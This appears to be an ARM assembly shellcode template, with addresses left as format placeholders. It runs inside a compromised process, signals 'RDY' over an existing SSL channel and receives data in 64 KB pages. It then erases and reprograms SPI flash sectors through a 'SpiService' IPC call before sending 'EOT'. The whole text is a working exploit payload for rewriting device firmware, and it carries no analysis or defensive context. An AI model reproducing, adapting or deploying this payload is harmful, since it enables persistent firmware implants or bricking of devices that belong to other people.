start:	
	PUSH	{R5,R6,R8,LR}

	SUB	SP, SP, #4

	LDR	R0, wbuff
	LDR	R1, rdy
	STR	R1, [R0]

	LDR     R3, SSL_Write
	MOV     R2, #0x4
	LDR     R1, wbuff
	MOV     R0, R7
	BLX 	R3

	MOV	R8, #0
do_page:
	
	MOV 	R6, #0
get_data:
	LDR	R3, SSL_Read
	LDR	R2, page_size
	LDR     R1, wbuff
        MOV     R5, #0x1000
        ADD     R1, R5
	ADD	R1, R6
	MOV	R0, R7
	BLX	R3

	ADD	R6, R0
	
	LDR 	R1, wbuff
	STR	R0, [R1]

	LDR     R3, SSL_Write
	MOV     R2, #0x8
	LDR     R1, wbuff
	MOV     R0, R7
	BLX 	R3

	LDR	R0, page_size
	CMP	R6, R0
	BNE	get_data

erase:
	LDR	R3, wbuff
	LDR	R0, off
	ADD	R3, R3, R0
	LDR	R0, addr
	ADD	R0, R8
	STR	R0, [R3]
	MOV	R1, #0
	STR	R1, [R3, #4]
	LDR	R2, chip
	STRB	R2, [R3, #9]

	ADD	R3, R3, #8
	MOV	R2, #0
	STRB	R2, [R3, #3]
	MOV	R2, #0xD8
	STRB	R2, [R3, #2]
	SUB	R3, R3, #8

	MOV	R1, #0xEE
	STRB	R1, [R3, #0x110]
	MOV	R0, #1
	STRB	R0, [R3, #0x111]

	LDR	R5, VComClientSync_Call
	MOV	R1, R3
	LDR	R2, insz
	LDR 	R3, wbuff
	LDR	R0, off
	STR	R0, [SP]
	ADR	R0, svc_name
	BLX	R5

	MOV 	R6, #0
wloop:	
	LDR	R3, wbuff
	LDR	R0, off
	ADD	R3, R3, R0
	LDR	R0, addr
	ADD	R0, R6
	ADD	R0, R8
	STR	R0, [R3]
	MOV	R1, #0x100
	STR	R1, [R3, #4]
	LDR	R2, chip
	STRB	R2, [R3, #9]

	ADD	R3, R3, #8
	MOV	R2, #0
	STRB	R2, [R3, #3]
	MOV	R2, #0x2
	STRB	R2, [R3, #2]
	SUB	R3, R3, #8

	MOV	R1, #0xEE
	STRB	R1, [R3, #0x110]
	MOV	R0, #1
	STRB	R0, [R3, #0x111]

	MOV 	R5, R3
	
	MOV	R2, #0x100
	LDR	R1, wbuff
	MOV	R3, #0x1000
	ADD	R1, R3
	ADD	R1, R6
	MOV	R0, R5
	ADD	R0, #8
	ADD	R0, #5
	LDR	R3, memcpy
	BLX 	R3

	MOV	R1, R5
	LDR	R5, VComClientSync_Call
	LDR	R2, insz
	LDR 	R3, wbuff
	LDR	R0, off
	STR	R0, [SP]
	ADR	R0, svc_name
	BLX	R5

	ADD	R6, #0x100
	LDR	R0, page_size
	CMP	R6, R0
	BNE	wloop

	LDR	R0, page_size
	ADD	R8, R0
	LDR	R0, memcount
	CMP	R8, R0
	BNE	do_page
	
theend:	
	LDR	R0, wbuff
	LDR	R1, eot
	STR	R1, [R0]

	LDR     R3, SSL_Write
	MOV     R2, #0x8
	LDR     R1, wbuff
	MOV     R0, R7
	BLX 	R3
	
	ADD	SP, SP, #4
	
	MOV	R0, -257
	POP	{R5,R6,R8,LR}
	BX	LR

wbuff: 			.word 0x%x
SSL_Write: 		.word 0x%x
SSL_Read:		.word 0x%x

wsize: 			.word 0x818
off:			.word 0x408
insz:			.word 0x114
addr:			.word 0x%x
memcount:		.word 0x%x
chip:			.word 0x%x
VComClientSync_Call:	.word 0x%x
memcpy:			.word 0x%x
page_size:		.word 0x10000
svc_name:		.string "SpiService"
.align
eot:			.string "EOT"
.align
rdy:			.string "RDY"
.align
final: 			.word 0x41414141
